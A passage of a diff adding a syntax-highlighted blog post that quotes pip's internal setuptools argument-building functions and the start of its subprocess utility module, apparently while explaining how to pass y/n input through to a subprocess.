+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110</span><span>    args <span style="color:#f92672">+=</span> build_options
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111</span><span>    <span style="color:#66d9ef">return</span> args
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_setuptools_clean_args</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115</span><span>    setup_py_path: str,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116</span><span>    global_options: Sequence[str],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117</span><span>) <span style="color:#f92672">-&gt;</span> List[str]:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118</span><span>    args <span style="color:#f92672">=</span> make_setuptools_shim_args(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119</span><span>        setup_py_path, global_options<span style="color:#f92672">=</span>global_options, unbuffered_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120</span><span>    )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121</span><span>    args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;clean&#34;</span>, <span style="color:#e6db74">&#34;--all&#34;</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122</span><span>    <span style="color:#66d9ef">return</span> args
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_setuptools_develop_args</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126</span><span>    setup_py_path: str,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127</span><span>    <span style="color:#f92672">*</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128</span><span>    global_options: Sequence[str],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129</span><span>    no_user_config: bool,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130</span><span>    prefix: Optional[str],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131</span><span>    home: Optional[str],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132</span><span>    use_user_site: bool,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133</span><span>) <span style="color:#f92672">-&gt;</span> List[str]:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134</span><span>    <span style="color:#66d9ef">assert</span> <span style="color:#f92672">not</span> (use_user_site <span style="color:#f92672">and</span> prefix)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136</span><span>    args <span style="color:#f92672">=</span> make_setuptools_shim_args(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137</span><span>        setup_py_path,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138</span><span>        global_options<span style="color:#f92672">=</span>global_options,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139</span><span>        no_user_config<span style="color:#f92672">=</span>no_user_config,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140</span><span>    )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142</span><span>    args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;develop&#34;</span>, <span style="color:#e6db74">&#34;--no-deps&#34;</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144</span><span>    <span style="color:#66d9ef">if</span> prefix:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145</span><span>        args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;--prefix&#34;</span>, prefix]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146</span><span>    <span style="color:#66d9ef">if</span> home <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147</span><span>        args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;--install-dir&#34;</span>, home]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149</span><span>    <span style="color:#66d9ef">if</span> use_user_site:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150</span><span>        args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;--user&#34;</span>, <span style="color:#e6db74">&#34;--prefix=&#34;</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152</span><span>    <span style="color:#66d9ef">return</span> args
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_setuptools_egg_info_args</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156</span><span>    setup_py_path: str,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157</span><span>    egg_info_dir: Optional[str],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158</span><span>    no_user_config: bool,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159</span><span>) <span style="color:#f92672">-&gt;</span> List[str]:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160</span><span>    args <span style="color:#f92672">=</span> make_setuptools_shim_args(setup_py_path, no_user_config<span style="color:#f92672">=</span>no_user_config)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162</span><span>    args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;egg_info&#34;</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164</span><span>    <span style="color:#66d9ef">if</span> egg_info_dir:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165</span><span>        args <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;--egg-base&#34;</span>, egg_info_dir]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167</span><span>    <span style="color:#66d9ef">return</span> args</span></span></code></pre></div></p>
+<p>Since this code is called in a subprocess, we need to relay the input (either y or n) from the main process to the subprocess.</p>
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1</span><span><span style="color:#75715e"># pip/_internal/utils/subprocess.py</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2</span><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3</span><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4</span><span><span style="color:#f92672">import</span> shlex
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5</span><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6</span><span><span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7</span><span>    TYPE_CHECKING,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8</span><span>    Any,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9</span><span>    Callable,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10</span><span>    Iterable,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11</span><span>    List,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12</span><span>    Mapping,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13</span><span>    Optional,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14</span><span>    Union,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15</span><span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17</span><span><span style="color:#f92672">from</span> pip._vendor.rich.markup <span style="color:#f92672">import</span> escape
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19</span><span><span style="color:#f92672">from</span> pip._internal.cli.spinners <span style="color:#f92672">import</span> SpinnerInterface, open_spinner
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20</span><span><span style="color:#f92672">from</span> pip._internal.exceptions <span style="color:#f92672">import</span> InstallationSubprocessError
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21</span><span><span style="color:#f92672">from</span> pip._internal.utils.logging <span style="color:#f92672">import</span> VERBOSE, subprocess_logger
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22</span><span><span style="color:#f92672">from</span> pip._internal.utils.misc <span style="color:#f92672">import</span> HiddenText
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24</span><span><span style="color:#66d9ef">if</span> TYPE_CHECKING:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25</span><span>    <span style="color:#75715e"># Literal was introduced in Python 3.8.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26</span><span>    <span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27</span><span>    <span style="color:#75715e"># TODO: Remove `if TYPE_CHECKING` when dropping support for Python 3.7.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28</span><span>    <span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> Literal
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30</span><span>CommandArgs <span style="color:#f92672">=</span> List[Union[str, HiddenText]]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_command</span>(<span style="color:#f92672">*</span>args: Union[str, HiddenText, CommandArgs]) <span style="color:#f92672">-&gt;</span> CommandArgs:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34</span><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35</span><span><span style="color:#e6db74">    Create a CommandArgs object.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36</span><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37</span><span>    command_args: CommandArgs <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38</span><span>    <span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> args:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39</span><span>        <span style="color:#75715e"># Check for list instead of CommandArgs since CommandArgs is</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40</span><span>        <span style="color:#75715e"># only known during type-checking.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41</span><span>        <span style="color:#66d9ef">if</span> isinstance(arg, list):
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42</span><span>            command_args<span style="color:#f92672">.</span>extend(arg)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43</span><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44</span><span>            <span style="color:#75715e"># Otherwise, arg is str or HiddenText.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45</span><span>            command_args<span style="color:#f92672">.</span>append(arg)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47</span><span>    <span style="color:#66d9ef">return</span> command_args
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format_command_args</span>(args: Union[List[str], CommandArgs]) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51</span><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52</span><span><span style="color:#e6db74">    Format command arguments for display.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53</span><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54</span><span>    <span style="color:#75715e"># For HiddenText arguments, display the redacted form by calling str().</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55</span><span>    <span style="color:#75715e"># Also, we don&#39;t apply str() to arguments that aren&#39;t HiddenText since</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56</span><span>    <span style="color:#75715e"># this can trigger a UnicodeDecodeError in Python 2 if the argument</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57</span><span>    <span style="color:#75715e"># has type unicode and includes a non-ascii character.  (The type</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58</span><span>    <span style="color:#75715e"># checker doesn&#39;t ensure the annotations are correct in all cases.)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>join(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60</span><span>        shlex<span style="color:#f92672">.</span>quote(str(arg)) <span style="color:#66d9ef">if</span> isinstance(arg, HiddenText) <span style="color:#66d9ef">else</span> shlex<span style="color:#f92672">.</span>quote(arg)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61</span><span>        <span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> args
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62</span><span>    )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reveal_command_args</span>(args: Union[List[str], CommandArgs]) <span style="color:#f92672">-&gt;</span> List[str]:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66</span><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67</span><span><span style="color:#e6db74">    Return the arguments in their raw, unredacted form.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68</span><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69</span><span>    <span style="color:#66d9ef">return</span> [arg<span style="color:#f92672">.</span>secret <span style="color:#66d9ef">if</span> isinstance(arg, HiddenText) <span style="color:#66d9ef">else</span> arg <span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> args]
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call_subprocess</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73</span><span>    cmd: Union[List[str], CommandArgs],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74</span><span>    show_stdout: bool <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75</span><span>    cwd: Optional[str] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76</span><span>    on_returncode: <span style="color:#e6db74">&#39;Literal[&#34;raise&#34;, &#34;warn&#34;, &#34;ignore&#34;]&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;raise&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77</span><span>    extra_ok_returncodes: Optional[Iterable[int]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78</span><span>    extra_environ: Optional[Mapping[str, Any]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79</span><span>    unset_environ: Optional[Iterable[str]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80</span><span>    spinner: Optional[SpinnerInterface] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81</span><span>    log_failed_cmd: Optional[bool] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82</span><span>    stdout_only: Optional[bool] <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83</span><span>    <span style="color:#f92672">*</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84</span><span>    command_desc: str,
